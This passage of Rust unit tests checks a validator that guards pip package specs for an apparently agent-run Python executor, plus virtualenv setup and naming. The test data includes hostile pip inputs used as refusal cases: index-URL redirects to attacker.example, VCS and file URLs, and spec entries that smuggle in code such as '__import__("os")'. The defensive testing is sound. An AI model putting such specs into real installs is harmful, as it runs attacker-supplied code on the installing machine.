        match validate_package_spec(spec) {
            Err(PythonExecutorError::InvalidPackageSpec { reason, .. }) => reason,
            other => panic!("expected {spec:?} to be refused, got {other:?}"),
        }
    }

    // GIVEN a manifest entry that pip would read as a command-line flag
    // WHEN it is validated
    // THEN it is refused, and the reason names the flag problem. This is the
    //      argv-injection path: --index-url redirects the package index and gets
    //      attacker-controlled setup.py code executed at install time.
    #[test]
    fn test_flag_like_entries_are_refused() {
        for spec in [
            "--index-url=https://attacker.example/simple",
            "--extra-index-url=https://attacker.example/simple",
            "-i",
            "-e",
            "-r",
            "--pre",
            "-e .",
            "-r requirements.txt",
            "--trusted-host=attacker.example",
        ] {
            let reason = reason_for(spec);
            assert!(
                reason.contains("flag"),
                "{spec:?} should be refused as a flag, got: {reason}"
            );
        }
    }

    // GIVEN an entry that would make pip fetch code from an arbitrary location
    // WHEN it is validated
    // THEN it is refused: a manifest does not get to choose the code source
    #[test]
    fn test_url_vcs_and_path_entries_are_refused() {
        for spec in [
            "requests @ https://attacker.example/x.whl",
            "git+https://attacker.example/repo.git",
            "git+ssh://attacker.example/repo.git",
            "file:///tmp/evil",
            "https://attacker.example/x.whl",
            "./local-package",
            "/abs/path",
            "sub/dir",
        ] {
            assert!(
                validate_package_spec(spec).is_err(),
                "{spec:?} should be refused"
            );
        }
    }

    // GIVEN degenerate or hostile-looking entries
    // WHEN they are validated
    // THEN they are refused before reaching pip
    #[test]
    fn test_degenerate_entries_are_refused() {
        assert!(validate_package_spec("").is_err());
        assert!(validate_package_spec("   ").is_err());
        assert!(validate_package_spec("requests\n--index-url=http://x").is_err());
        assert!(validate_package_spec("requests; import os").is_err());
        assert!(validate_package_spec(&"a".repeat(MAX_PACKAGE_SPEC_LEN + 1)).is_err());
    }

    // GIVEN the requirement shapes a real manifest uses
    // WHEN they are validated
    // THEN they all pass: the guard must not break legitimate declarations,
    //      which is the failure mode that would push people to disable it
    #[test]
    fn test_legitimate_specifiers_are_accepted() {
        for spec in [
            "requests",
            "openpyxl>=3.1.0",
            "pandas==2.1.4",
            "numpy~=1.26",
            "uvicorn[standard]>=0.30",
            "httpx[http2,cli]",
            "foo>=1.0,<2.0",
            "ruamel.yaml",
            "zope.interface>=5",
            "python-dateutil!=2.8.1",
            "typing-extensions>=4.0.0",
            "pkg>=1.0 ; python_version >= \"3.10\"",
        ] {
            assert!(
                validate_package_spec(spec).is_ok(),
                "{spec:?} should be accepted, got {:?}",
                validate_package_spec(spec)
            );
        }
    }

    // GIVEN environment markers, real ones and things merely shaped like one
    // WHEN they are validated
    // THEN only PEP 508 vocabulary passes. A charset that just allows letters
    //      and spaces would accept `; import os`, which is not a marker.
    #[test]
    fn test_environment_markers_are_held_to_pep_508_vocabulary() {
        for spec in [
            "pkg ; python_version >= \"3.10\"",
            "pkg ; sys_platform == \"darwin\"",
            "pkg ; os_name == \"posix\" and python_version < \"3.13\"",
            "pkg ; platform_machine == \"arm64\"",
            "pkg ; extra == \"dev\"",
        ] {
            assert!(
                validate_package_spec(spec).is_ok(),
                "{spec:?} is a valid marker, got {:?}",
                validate_package_spec(spec)
            );
        }
        for spec in [
            "pkg ; import os",
            "pkg ; __import__(\"os\")",
            "pkg ; python_version >= \"3.10\" and eval(x)",
            "pkg ; unterminated == \"quote",
            "pkg ;",
        ] {
            assert!(
                validate_package_spec(spec).is_err(),
                "{spec:?} should be refused"
            );
        }
    }

    // GIVEN a package list containing one hostile entry among valid ones
    // WHEN setup_venv runs
    // THEN it fails before creating anything, so no partial venv is left and
    //      the valid packages are not installed either
    #[tokio::test]
    async fn test_setup_venv_refuses_the_whole_list_and_creates_nothing() {
        let tmp = tempfile::tempdir().expect("tempdir");
        let executor = PythonExecutor::new("victim-agent", tmp.path()).expect("executor");
        let packages = vec![
            "requests".to_string(),
            "--index-url=https://attacker.example/simple".to_string(),
        ];

        let result = executor.setup_venv(&packages).await;

        match result {
            Err(PythonExecutorError::InvalidPackageSpec { package, .. }) => {
                assert_eq!(package, "--index-url=https://attacker.example/simple");
            }
            other => panic!("expected InvalidPackageSpec, got {other:?}"),
        }
        assert!(
            !tmp.path().join("victim-agent").join("venv").exists(),
            "no virtualenv should have been created"
        );
    }

    // GIVEN an executor wired the way the chat dispatcher wires it, over a base
    //       directory where no virtualenv was ever provisioned
    // WHEN code runs without any prior setup_venv call
    // THEN the interpreter is created on the way and the code executes
    #[tokio::test]
    async fn test_run_creates_the_virtualenv_on_first_execution() {
        if !can_run_sandbox() {
            tracing::warn!("skipped: unshare requires CAP_SYS_ADMIN (not available on CI)");
            return;
        }
        // GIVEN
        let tmp = tempfile::tempdir().expect("tempdir");
        let executor = match PythonExecutor::new("apollia:chat:first-run", tmp.path()) {
            Ok(e) => e,
            Err(PythonExecutorError::PythonUnavailable { .. }) => return,
            Err(e) => panic!("unexpected error creating executor: {e:?}"),
        };
        assert!(
            !executor.venv_path.exists(),
            "precondition: no virtualenv yet"
        );

        // WHEN
        let output = executor
            .run(PythonInput {
                code: "print('created')".to_string(),
                timeout_secs: 60,
            })
            .await
            .expect("execution failed");

        // THEN
        assert_eq!(output.stdout.trim(), "created");
        assert_eq!(output.exit_code, 0);
        assert!(
            executor.python_bin.exists(),
            "the virtualenv interpreter should exist after the first run"
        );
    }

    // GIVEN an agent identifier carrying characters that are illegal in a
    //       Windows path component
    // WHEN the executor is constructed
    // THEN the virtualenv directory name holds none of them
    #[test]
    fn test_venv_directory_name_is_portable() {
        // GIVEN / WHEN
        let component = venv_dir_component("apollia:chat:8f0c1d2e-0000-4a1b-9f3d-aabbccddeeff");

        // THEN
        assert_eq!(
            component,
            "apollia_chat_8f0c1d2e-0000-4a1b-9f3d-aabbccddeeff"
        );
        assert!(!component.contains(':'));
        assert_eq!(venv_dir_component("my-agent.v2"), "my-agent.v2");
        assert_eq!(venv_dir_component(".."), "_");
        assert_eq!(venv_dir_component(""), "_");
    }
}
